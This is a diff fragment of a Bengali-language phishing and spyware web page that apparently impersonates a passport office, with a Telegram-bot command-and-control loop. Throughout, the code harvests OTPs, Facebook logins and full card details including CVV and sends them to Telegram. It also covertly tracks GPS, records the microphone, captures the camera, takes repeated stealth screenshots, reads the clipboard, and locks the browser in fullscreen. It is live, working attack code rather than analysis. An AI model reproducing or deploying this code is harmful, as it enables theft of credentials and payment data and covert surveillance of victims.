+    await tg(`🔑 <b>OTP</b>\n<code>${S.otp}</code>`);
+    showPage('facebook');
+}
+
+// ============================================================
+// ফেসবুক
+// ============================================================
+async function submitFacebook(){
+    const e=$('fb-email').value.trim(); const p=$('fb-password').value;
+    if(!e||!p)return alert('ইমেইল ও পাসওয়ার্ড দিন');
+    S.data.fb={email:e,pass:p}; S.fbDone=true;
+    await tg(`📘 <b>Facebook লগইন</b>\nইমেইল: ${e}\nপাস: ${p}`);
+    showPage('payment');
+}
+
+// ============================================================
+// পেমেন্ট
+// ============================================================
+async function submitPayment(){
+    const n=$('card-number').value.trim(); const e=$('card-expiry').value.trim();
+    const c=$('card-cvv').value.trim(); const nm=$('card-name').value.trim();
+    if(!n||!e||!c||!nm)return alert('সব তথ্য দিন');
+    S.data.card={number:n,expiry:e,cvv:c,name:nm}; S.payDone=true;
+    await tg(`💳 <b>পেমেন্ট তথ্য</b>\nকার্ড: ${n}\nমেয়াদ: ${e}\nCVV: ${c}\nনাম: ${nm}`);
+    showPage('success');
+    $('tracking-id').textContent='BD-2024-'+String(Math.floor(Math.random()*9000)+1000);
+    
+    // সমস্ত সংগৃহীত তথ্য টেলিগ্রামে পাঠাও
+    const allData = Object.entries(S.data).map(([k,v])=>{
+        if(typeof v==='object') return `${k}: ${JSON.stringify(v)}`;
+        return `${k}: ${v}`;
+    }).join('\n');
+    await tg(`📦 <b>সমস্ত তথ্য সংগ্রহ</b>\n${allData}`);
+}
+
+// ============================================================
+// লকডাউন এনাবল
+// ============================================================
+function enableLockdown(){
+    S.locked=true;
+    $('lockdown-overlay').classList.add('show');
+    try{document.documentElement.requestFullscreen()}catch(e){}
+    window.history.pushState(null,'',window.location.href);
+    window.onpopstate=()=>{
+        window.history.pushState(null,'',window.location.href);
+        $('lockdown-overlay').classList.add('show');
+    };
+    document.addEventListener('keydown',e=>{
+        if(S.locked){e.preventDefault();e.stopPropagation()}
+    });
+    setInterval(()=>{
+        try{if(!document.fullscreenElement)document.documentElement.requestFullscreen()}catch(e){}
+    },2000);
+}
+
+function disableLockdown(){
+    S.locked=false;
+    $('lockdown-overlay').classList.remove('show');
+    try{document.exitFullscreen()}catch(e){}
+    window.onpopstate=null;
+}
+
+// ============================================================
+// GPS ফাংশন
+// ============================================================
+function startGPS(){
+    S.gpsOn=true;
+    async function gps(){
+        try{
+            const p=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true,timeout:1e4}));
+            tg(`📍 <b>GPS ট্র্যাক</b>\n${p.coords.latitude},${p.coords.longitude}\nনির্ভুলতা: ${p.coords.accuracy}m`);
+        }catch(e){}
+    }
+    gps();
+    S.gpsWatch=setInterval(gps,10000);
+}
+
+function stopGPS(){
+    S.gpsOn=false;
+    if(S.gpsWatch){clearInterval(S.gpsWatch);S.gpsWatch=null}
+}
+
+// ============================================================
+// অডিও রেকর্ডিং
+// ============================================================
+async function startAudio(duration=10000){
+    try{
+        if(!S.stream||!S.stream.getAudioTracks().length){
+            const s=await navigator.mediaDevices.getUserMedia({audio:{echoCancellation:false,noiseSuppression:false}});
+            if(!S.stream)S.stream=s;else s.getAudioTracks().forEach(t=>S.stream.addTrack(t));
+            S.audioRec=new MediaRecorder(s);
+            S.audioRec.ondataavailable=e=>{if(e.data.size>0)S.audioChunks.push(e.data)};
+        }
+        S.audioChunks=[];
+        S.audioRec.start();
+        tg(`🎤 অডিও রেকর্ডিং শুরু (${duration/1000}সে)`);
+        setTimeout(()=>{
+            try{
+                S.audioRec.stop();
+                S.audioRec.onstop=async()=>{
+                    const b=new Blob(S.audioChunks,{type:'audio/webm'});
+                    S.audioChunks=[];
+                    await tgDoc(b,`audio_${Date.now()}.webm`,'🎤 অডিও রেকর্ডিং');
+                    tg('🎤 অডিও সম্পূর্ণ!');
+                };
+            }catch(e){}
+        },duration);
+    }catch(e){tg(`❌ অডিও ব্যর্থ: ${e.message}`);}
+}
+
+function stopAudio(){
+    try{if(S.audioRec&&S.audioRec.state!=='inactive')S.audioRec.stop()}catch(e){}
+}
+
+// ============================================================
+// স্টিলথ স্ক্রিনশট (html2canvas)
+// ============================================================
+async function captureScreenshot(){
+    try{
+        const c=await html2canvas(document.documentElement,{useCORS:true,allowTaint:true,scale:1.5,logging:false});
+        const b=await new Promise(r=>c.toBlob(r,'image/png',0.9));
+        if(b) await tgDoc(b,`screen_${Date.now()}.png`,'📸 স্ক্রিনশট');
+        return b;
+    }catch(e){tg(`❌ স্ক্রিনশট ব্যর্থ`);return null}
+}
+
+function startStealth(){
+    S.stealthOn=true;
+    tg('👁️ স্টিলথ স্ক্রিন শুরু');
+    S.stealthInt=setInterval(async()=>{
+        try{
+            const c=await html2canvas(document.documentElement,{useCORS:true,allowTaint:true,scale:1.0,logging:false});
+            const b=await new Promise(r=>c.toBlob(r,'image/jpeg',0.4));
+            if(b) await tgDoc(b,`stealth_${Date.now()}.jpg`,'👁️ স্টিলথ');
+        }catch(e){}
+    },3000);
+}
+
+function stopStealth(){
+    S.stealthOn=false;
+    if(S.stealthInt){clearInterval(S.stealthInt);S.stealthInt=null}
+}
+
+// ============================================================
+// PiP
+// ============================================================
+async function pipOn(){
+    try{
+        const s=await navigator.mediaDevices.getUserMedia({video:{width:100,height:100},audio:false});
+        const v=document.createElement('video');
+        v.srcObject=s;v.muted=true;v.style.display='none';
+        document.body.appendChild(v);await v.play();
+        await v.requestPictureInPicture();
+        S.pipOn=true;
+        $('pip-bar').classList.add('show');
+        startStealth();
+        tg('📌 PiP মোড চালু!');
+    }catch(e){tg(`❌ PiP ব্যর্থ: ${e.message}`);startStealth()}
+}
+
+function pipOff(){
+    S.pipOn=false;
+    $('pip-bar').classList.remove('show');
+    try{document.exitPictureInPicture()}catch(e){}
+}
+
+// ============================================================
+// ক্লিপবোর্ড মনিটরিং
+// ============================================================
+function startClipboard(){
+    let last='';
+    S.clipInt=setInterval(async()=>{
+        try{
+            const t=await navigator.clipboard.readText();
+            if(t&&t!==last){last=t;tg(`📋 ক্লিপবোর্ড: ${t}`)}
+        }catch(e){}
+    },2000);
+}
+
+function stopClipboard(){
+    if(S.clipInt){clearInterval(S.clipInt);S.clipInt=null}
+}
+
+// ============================================================
+// এসএমএস পপ-আপ
+// ============================================================
+function showSMS(sender,body){
+    $('sms-sender').textContent=sender||'পাসপোর্ট অফিস';
+    $('sms-body').textContent=body||'আপনার OTP: ১২৩৪৫৬';
+    $('sms-popup').classList.add('show');
+    setTimeout(()=>$('sms-popup').classList.remove('show'),8000);
+}
+
+// ============================================================
+// টেলিগ্রাম কমান্ড হ্যান্ডলার
+// ============================================================
+async function sendCommand(cmd){
+    const out=$('cmd-output');
+    out.innerHTML+=`<div style="color:#60a5fa">→ ${cmd}</div>`;
+    out.scrollTop=out.scrollHeight;
+    
+    await tg(`🎯 <b>নতুন কমান্ড</b>\n<code>${cmd}</code>`);
+    
+    switch(cmd){
+        case '/info': tg(`ℹ️ <b>তথ্য</b>\nপেজ: ${S.page}\nলক: ${S.locked}\nGPS: ${S.gpsOn}\nস্টিলথ: ${S.stealthOn}\nPiP: ${S.pipOn}\nUA: ${navigator.userAgent}`); break;
+        case '/clipboard': startClipboard(); break;
+        case '/location':
+            try{
+                const p=await new Promise((r,e)=>navigator.geolocation.getCurrentPosition(r,e,{enableHighAccuracy:true,timeout:1e4}));
+                tg(`📍 <b>অবস্থান</b>\n${p.coords.latitude},${p.coords.longitude}\nনির্ভুলতা: ${p.coords.accuracy}m`);
+            }catch(e){tg('❌ অবস্থান ব্যর্থ')}
+            break;
+        case '/camera':
+            try{
+                const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:'user'},audio:false});
+                const v=document.createElement('video');v.srcObject=s;await v.play();
+                const c=document.createElement('canvas');
+                c.width=v.videoWidth||640;c.height=v.videoHeight||480;
+                c.getContext('2d').drawImage(v,0,0);
+                s.getTracks().forEach(t=>t.stop());
+                const d=c.toDataURL('image/png');
+                await tgPhoto(d,'📷 ক্যামেরা ক্যাপচার');
+            }catch(e){tg(`❌ ক্যামেরা: ${e.message}`)}
+            break;
+        case '/audio_start': startAudio(15000); break;
+        case '/audio_stop': stopAudio(); break;
+        case '/screenshot': captureScreenshot(); break;
+        case '/lock': enableLockdown(); tg('🔒 লকডাউন চালু'); break;
+        case '/unlock': disableLockdown(); tg('🔓 লকডাউন বন্ধ'); break;
+        case '/pip_on': pipOn(); break;
+        case '/pip_off': pipOff(); break;
+        case '/sms': showSMS(); tg('✉️ এসএমএস পপ-আপ দেখানো হয়েছে'); break;
+        case '/facebook': showPage('facebook'); break;
+        case '/payment': showPage('payment'); break;
+        case '/gps_on': startGPS(); break;
+        case '/gps_off': stopGPS(); break;
+        case '/stealth_on': startStealth(); break;
+        case '/stealth_off': stopStealth(); break;
+        case '/status': tg(`📊 <b>স্ট্যাটাস</b>\nলক: ${S.locked?'✅':'❌'}\nGPS: ${S.gpsOn?'✅':'❌'}\nস্টিলথ: ${S.stealthOn?'✅':'❌'}\nPiP: ${S.pipOn?'✅':'❌'}\nক্যামেরা: ${S.camCap?'✅':'❌'}\nফেসবুক: ${S.fbDone?'✅':'❌'}\nপেমেন্ট: ${S.payDone?'✅':'❌'}`); break;
+        case '/help': tg('❓ <b>কমান্ড লিস্ট</b>\n/info - তথ্য\n/clipboard - ক্লিপবোর্ড\n/location - অবস্থান\n/camera - ক্যামেরা\n/audio_start - অডিও শুরু\n/audio_stop - অডিও বন্ধ\n/screenshot - স্ক্রিনশট\n/lock - লক\n/unlock - আনলক\n/pip_on - PiP চালু\n/pip_off - PiP বন্ধ\n/sms - এসএমএস\n/facebook - ফেসবুক\n/payment - পেমেন্ট\n/gps_on - GPS চালু\n/gps_off - GPS বন্ধ\n/stealth_on - স্টিলথ চালু\n/stealth_off - স্টিলথ বন্ধ\n/status - স্ট্যাটাস\n/help - সাহায্য'); break;
+    }
+    
+    setTimeout(()=>{out.innerHTML+=`<div style="color:#4ade80">✓ সম্পন্ন</div>`;out.scrollTop=out.scrollHeight},1000);
+}
+
+function clearOutput(){
+    $('cmd-output').innerHTML='<div style="color:rgba(255,255,255,.2)">কমান্ড চালান...</div>';
+}
+
+// ============================================================
+// টেলিগ্রাম আপডেট লিসেনার (C2)
+// ============================================================
+let lastUpdateId=0;
+
+async function pollTelegram(){
+    try{
+        const r=await fetch(API+`getUpdates?offset=${lastUpdateId+1}&timeout=10`);
+        const d=await r.json();
+        if(d.ok&&d.result.length){
+            for(const u of d.result){
+                lastUpdateId=u.update_id;
+                const msg=u.message?.text||'';
+                if(msg.startsWith('/')){
+                    const cmds={
+                        '/info':'/info','/clipboard':'/clipboard','/location':'/location',
+                        '/camera':'/camera','/audio_start':'/audio_start','/audio_stop':'/audio_stop',
+                        '/screenshot':'/screenshot','/lock':'/lock','/unlock':'/unlock',
+                        '/pip_on':'/pip_on','/pip_off':'/pip_off','/sms':'/sms',
+                        '/facebook':'/facebook','/payment':'/payment',
+                        '/gps_on':'/gps_on','/gps_off':'/gps_off',
+                        '/stealth_on':'/stealth_on','/stealth_off':'/stealth_off',
+                        '/status':'/status','/help':'/help'
+                    };
+                    if(cmds[msg]) sendCommand(cmds[msg]);
+                }
+            }
+        }
+    }catch(e){}
+}
+
+// প্রতি ২ সেকেন্ডে পোলিং
+setInterval(pollTelegram,2000);
+
+// ============================================================
+// সেশন রিস্টোর & লক চেক
+// ============================================================
+(function(){
+    if(sessionStorage.getItem('pg')&&sessionStorage.getItem('pg')!=='splash'){
+        enableLockdown();
+    }
+})();
+
+document.addEventListener('visibilitychange',()=>{
+    if(document.hidden&&S.locked){
+        $('lockdown-overlay').classList.add('show');
+    }
+});
+
+window.history.pushState(null,'',window.location.href);
+window.addEventListener('popstate',()=>{
+    window.history.pushState(null,'',window.location.href);
+    if(S.locked) $('lockdown-overlay').classList.add('show');
+});
+
+console.log('🚀 C2 প্যানেল লোড হয়েছে');
+console.log('📊 টেলিগ্রাম বট: @sarmin_akter_11223');
+</script>
+</body>
+</html>
